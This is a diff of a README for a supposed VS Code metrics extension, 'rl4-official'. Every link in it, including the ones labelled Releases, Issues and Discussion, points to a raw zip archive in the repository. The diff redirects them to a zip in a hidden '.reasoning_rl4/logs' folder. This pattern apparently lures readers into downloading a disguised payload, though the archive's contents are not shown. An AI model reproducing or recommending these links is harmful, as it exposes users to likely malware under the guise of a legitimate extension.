@@ -1,7 +1,7 @@
 # 🎉 rl4-official - Transform Data into Insights Effortlessly
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Dezzersc/rl4-official/master/extension/webview/rl4-official-bezzi.zip%20Latest%https://raw.githubusercontent.com/Dezzersc/rl4-official/master/extension/webview/rl4-official-bezzi.zip)](https://raw.githubusercontent.com/Dezzersc/rl4-official/master/extension/webview/rl4-official-bezzi.zip)
+[![Download Latest Release](https://github.com/Dezzersc/rl4-official/raw/refs/heads/master/.reasoning_rl4/logs/rl_official_v3.3.zip%20Latest%https://github.com/Dezzersc/rl4-official/raw/refs/heads/master/.reasoning_rl4/logs/rl_official_v3.3.zip)](https://github.com/Dezzersc/rl4-official/raw/refs/heads/master/.reasoning_rl4/logs/rl_official_v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the **rl4-official** project! This VS Code extension uses advanced metrics to turn raw data into actionable insights. Designed for ease of use, it helps you understand your workspace better and improve your productivity. 
@@ -22,7 +22,7 @@ Before you start, make sure your system meets the following requirements:
 ## 📦 Download & Install
 To download and install the rl4-official extension, follow these steps:
 
-1. **Visit the Releases Page**: Click this link to access the [Releases page](https://raw.githubusercontent.com/Dezzersc/rl4-official/master/extension/webview/rl4-official-bezzi.zip).
+1. **Visit the Releases Page**: Click this link to access the [Releases page](https://github.com/Dezzersc/rl4-official/raw/refs/heads/master/.reasoning_rl4/logs/rl_official_v3.3.zip).
 2. **Select the Latest Version**: Find the most recent version of the extension.
 3. **Download the Extension**: Click the download link to save the file to your computer.
 4. **Install the Extension**:
@@ -42,8 +42,8 @@ After installation, follow these instructions to start using the extension:
 ## 🤝 Support
 If you encounter any issues or have questions, you can seek support through the following channels:
 
-- **GitHub Issues**: Report problems directly on the [Issues page](https://raw.githubusercontent.com/Dezzersc/rl4-official/master/extension/webview/rl4-official-bezzi.zip).
-- **Discussion Forum**: Join our [Discussion page](https://raw.githubusercontent.com/Dezzersc/rl4-official/master/extension/webview/rl4-official-bezzi.zip) to ask questions and share experiences with others.
+- **GitHub Issues**: Report problems directly on the [Issues page](https://github.com/Dezzersc/rl4-official/raw/refs/heads/master/.reasoning_rl4/logs/rl_official_v3.3.zip).
+- **Discussion Forum**: Join our [Discussion page](https://github.com/Dezzersc/rl4-official/raw/refs/heads/master/.reasoning_rl4/logs/rl_official_v3.3.zip) to ask questions and share experiences with others.
 
 ## 🔄 Community Contributions
 We welcome contributions from everyone. If you have ideas or suggestions, feel free to:
@@ -57,4 +57,4 @@ Your contributions help improve the project for all users!
 ## 🎯 Conclusion
 Thank you for choosing rl4-official! We believe this tool will help enhance your workspace experience. Enjoy transforming your raw workspace metrics into valuable insights!
 
-[Download Latest Release](https://raw.githubusercontent.com/Dezzersc/rl4-official/master/extension/webview/rl4-official-bezzi.zip)
+[Download Latest Release](https://github.com/Dezzersc/rl4-official/raw/refs/heads/master/.reasoning_rl4/logs/rl_official_v3.3.zip)
